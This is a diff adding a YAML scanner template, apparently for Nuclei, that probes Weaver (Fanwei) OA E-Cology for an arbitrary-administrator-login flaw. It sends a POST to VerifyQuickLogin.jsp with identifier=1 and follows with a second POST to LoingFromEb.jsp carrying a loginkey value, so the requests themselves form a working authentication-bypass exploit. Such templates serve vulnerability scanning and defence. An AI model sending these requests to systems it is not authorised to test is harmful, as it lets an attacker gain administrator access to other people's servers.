@@ -1,0 +1,37 @@
+id: poc-yaml-weaver-oa-ultra-vires
+
+info:
+  name: poc-yaml-weaver-oa-ultra-vires
+  author: xiaobaicai
+  severity: high
+  tags: xray-converted,ct-483454
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - raw:
+      - |
+        POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        identifier=1&language=1&ipaddress=x.x.x.x
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /mobile/plugin/plus/login/LoingFromEb.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        loginkey={{id}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
